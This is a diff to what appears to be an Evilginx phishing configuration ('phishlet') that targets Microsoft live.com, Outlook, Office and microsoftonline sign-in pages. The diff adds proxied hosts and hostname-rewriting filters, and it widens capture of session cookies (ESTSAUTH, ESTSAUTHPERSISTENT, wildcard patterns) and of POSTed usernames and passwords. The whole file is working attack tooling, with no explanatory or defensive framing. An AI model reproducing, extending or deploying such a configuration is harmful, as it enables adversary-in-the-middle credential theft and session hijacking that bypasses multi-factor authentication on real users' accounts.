@@ -1,25 +1,34 @@
 author: '@mrgretzky'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true}
   - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'outlook.com', session: true, is_landing: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'outlook.com', session: true, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
 sub_filters:
-  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.outlook.com', orig_sub: 'www', domain: 'outlook.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoft.com', orig_sub: 'login', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
   - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
   - domain: '.live.com'
-    keys: ['WLSSC','RPSSecAuth']
+    keys: ['WLSSC', 'RPSSecAuth', '.*,regexp']
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', '.*']
+  - domain: '.microsoft.com'
+    keys: ['.*,regexp']
+  - domain: '.outlook.com'
+    keys: ['.*,regexp']
 credentials:
   username:
-    key: 'login'
+    key: '(login|UserName)'
     search: '(.*)'
     type: 'post'
   password:
@@ -27,5 +36,5 @@ credentials:
     search: '(.*)'
     type: 'post'
 login:
-  domain: 'outlook.live.com'
-  path: '/owa/?nlp=1'
+  domain: 'login.live.com'
+  path: '/'
